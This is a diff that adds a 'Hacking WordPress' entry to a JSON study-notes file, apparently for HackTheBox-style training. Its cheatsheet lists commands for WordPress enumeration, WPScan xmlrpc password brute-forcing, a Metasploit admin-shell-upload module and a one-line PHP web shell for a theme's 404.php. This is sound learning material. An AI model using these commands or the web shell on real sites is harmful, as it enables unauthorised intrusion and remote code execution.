@@ -1,5 +1,22 @@
 [
   {
+    "id": "wordpress",
+    "title": "Hacking WordPress",
+    "date": "2026-11-01",
+    "series": "Web Attacks",
+    "tags": ["htb", "web", "wordpress", "cms", "wpscan", "lfi", "rce", "enumeration"],
+    "description": "Enumerating WordPress (core version, plugins, themes, users), WPScan, exploiting a vulnerable plugin (Mail Masta LFI), brute-forcing logins, and RCE via the theme editor and Metasploit.",
+    "cheatsheet": [
+      { "cmd": "curl -s http://<target> | grep '<meta name=\"generator\"'", "desc": "Identify the WordPress core version" },
+      { "cmd": "curl http://<target>/wp-json/wp/v2/users | jq", "desc": "Enumerate users via the REST API" },
+      { "cmd": "curl -s -I 'http://<target>/?author=1'", "desc": "Enumerate a user by author ID" },
+      { "cmd": "wpscan --url http://<target> --enumerate --api-token <TOKEN>", "desc": "Full scan: version, plugins, themes, users, vulns" },
+      { "cmd": "wpscan --password-attack xmlrpc -U <users> -P <wordlist> --url http://<target>", "desc": "Brute force logins (fast, via xmlrpc)" },
+      { "cmd": "msf> use exploit/unix/webapp/wp_admin_shell_upload", "desc": "Admin creds → reverse shell" },
+      { "cmd": "Theme Editor → 404.php → <?php system($_GET['cmd']); ?>", "desc": "Manual RCE as admin" }
+    ]
+  },
+  {
     "id": "ipmi",
     "title": "Footprinting IPMI",
     "date": "2026-10-28",
